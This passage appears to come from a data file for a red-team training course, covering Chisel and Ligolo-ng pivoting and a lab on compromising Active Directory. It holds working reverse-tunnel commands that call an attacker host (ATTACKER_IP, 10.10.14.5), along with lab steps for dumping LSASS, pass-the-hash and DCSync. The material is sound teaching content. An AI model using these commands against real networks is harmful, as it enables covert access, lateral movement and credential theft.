        "Chisel Reverse SOCKS5 Proxying over WebSockets: Chisel is a high-speed TCP/UDP tunnel written in Go that encapsulates traffic inside an encrypted HTTP/WebSocket connection. Because corporate egress firewalls permit outbound web traffic (ports 80 and 443), an attacker runs a Chisel server on their public VPS and executes a Chisel client on the compromised target ('chisel client ATTACKER_IP:8000 R:1080:socks'). This opens a local SOCKS5 proxy on the attacker's machine, routing all tool traffic through the internal pivot host.",
        "Ligolo-ng Virtual TUN Interface Architecture: Unlike traditional proxy tools (like Proxychains) that rely on user-space library hooking and fail on raw ICMP or SYN scans, Ligolo-ng establishes a true virtual TUN network interface on the attacker's Linux kernel. Running Ligolo-ng allows the attacker to add internal corporate subnets directly to their operating system routing table ('ip route add 10.10.10.0/24 dev ligolo'). This enables running Nmap SYN scans, ping, and Impacket natively without proxy wrappers.",
        "Multi-Hop Pivoting & Traversing Air-Gapped Segments: Complex red team assessments often require double or triple pivoting: relaying traffic through a DMZ web server to reach an internal workstation network, then pivoting through a compromised workstation to reach an air-gapped industrial SCADA network. Attackers chain multiple Chisel or Ligolo-ng relays, establishing nested tunnels where each hop forwards traffic deeper into restricted corporate enclaves.",
        "Dynamic SOCKS5 Configuration in Proxychains & Browser Testing: Once an encrypted pivot tunnel is established, attackers configure /etc/proxychains4.conf to point to the local SOCKS5 port (socks5 127.0.0.1 1080). Prepending 'proxychains' to command-line tools routes TCP connections through the compromised host. For web applications, attackers configure browser proxy extensions (FoxyProxy) to route browser sessions through the SOCKS5 proxy, allowing interactive manual testing of internal corporate web portals.",
      ],
      terminalCommands: [
        "chisel server --reverse --port 8000",
        "chisel client 10.10.14.5:8000 R:1080:socks",
        "sudo ip route add 10.10.10.0/24 dev ligolo",
      ],
      proTips: [
        "When using Chisel with Proxychains, edit `/etc/proxychains4.conf` and ensure `socks5 127.0.0.1 1080` is placed at the very bottom of the file.",
        "Always use Ligolo-ng over standard SSH SOCKS if you need to run high-speed port scans across internal subnets; TUN interfaces handle thousands of packets per second without socket lag.",
      ],
    },
  ],
  handsOnLab: {
    title: "Lab 9: Enterprise Active Directory Compromise & Multi-Hop Pivoting",
    target: "Simulated Corporate Forest (DC01, WebServer, Workstation01)",
    goal: "Breach an external Linux web server, establish an encrypted Ligolo-ng pivot into the internal 10.10.10.0/24 network, execute Kerberoasting to crack a service account, harvest LSASS on a workstation, and execute a remote DCSync to compromise the Domain Controller.",
    steps: [
      "1. Exploit external web app to gain reverse shell on dual-homed pivot server.",
      "2. Deploy Ligolo-ng agent and configure kernel TUN routing for 10.10.10.0/24.",
      "3. Execute impacket-GetUserSPNs to extract Kerberos TGS tickets across the pivot tunnel.",
      "4. Crack the service account hash offline with Hashcat mode 13100.",
      "5. Pass-the-Hash to Workstation01 and dump LSASS memory to recover domain administrator credentials.",
      "6. Execute impacket-secretsdump against DC01 to dump the entire NTDS.dit password hash database.",
    ],
    verification: "Submit the NTLM hash of the Domain Administrator and the krbtgt account from the NTDS.dit database dump.",
  },
  checklist: [
    { id: "ch9-t1", label: "Mastered Active Directory architecture: Forests, Domains, Trees, and trust relationships" },
    { id: "ch9-t2", label: "Deconstructed the 6-step Kerberos authentication dance (AS-REQ, TGT, TGS-REQ, TGS)" },
    { id: "ch9-t3", label: "Collected AD telemetry with SharpHound and mapped attack paths in BloodHound" },
    { id: "ch9-t4", label: "Executed Kerberoasting and AS-REP Roasting to harvest and crack service account hashes" },
    { id: "ch9-t5", label: "Dumped LSASS memory credentials with Mimikatz and executed remote DCSync attacks" },
    { id: "ch9-t6", label: "Moved laterally across internal workstations using Pass-the-Hash (PtH) with NetExec" },
    { id: "ch9-t7", label: "Established reverse SOCKS5 tunnels across restricted egress firewalls with Chisel" },
    { id: "ch9-t8", label: "Configured Ligolo-ng virtual TUN interfaces for seamless multi-subnet pivoting" },
  ],
};
